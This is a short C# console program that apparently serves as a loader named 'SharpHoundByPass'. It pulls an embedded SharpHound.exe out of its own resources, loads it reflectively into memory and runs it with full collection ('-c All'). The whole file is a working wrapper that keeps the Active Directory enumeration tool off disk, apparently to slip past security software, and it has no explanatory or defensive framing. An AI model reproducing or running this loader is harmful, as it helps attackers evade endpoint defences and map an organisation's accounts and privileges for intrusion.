// See https://aka.ms/new-console-template for more information
using System.Reflection;

try
{
    Program2.ExecuteFromMemory();
}
catch (Exception ex)
{
    Console.WriteLine(ex.ToString());
    string testing2 = Console.ReadLine();
}

class Program2
{
    public static void ExecuteFromMemory()
    {
        string resourceName = "SharpHoundByPass.SharpHound.exe";

        // Load the embedded resource into a byte array
        byte[] sharpHoundBytes;
        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
        {
            if (stream == null)
            {
                Console.WriteLine("Resource not found!");
                return;
            }

            sharpHoundBytes = new byte[stream.Length];
            stream.Read(sharpHoundBytes, 0, sharpHoundBytes.Length);
        }
        // Load the executable into memory
        Assembly assembly = Assembly.Load(sharpHoundBytes);

        // Find the entry point and invoke it
        MethodInfo entryPoint = assembly.EntryPoint;
        if (entryPoint != null)
        {
            object instance = assembly.CreateInstance(entryPoint.Name);
            entryPoint.Invoke(instance, new object[] { new string[] { "-c", "All" } });
        }
    }
}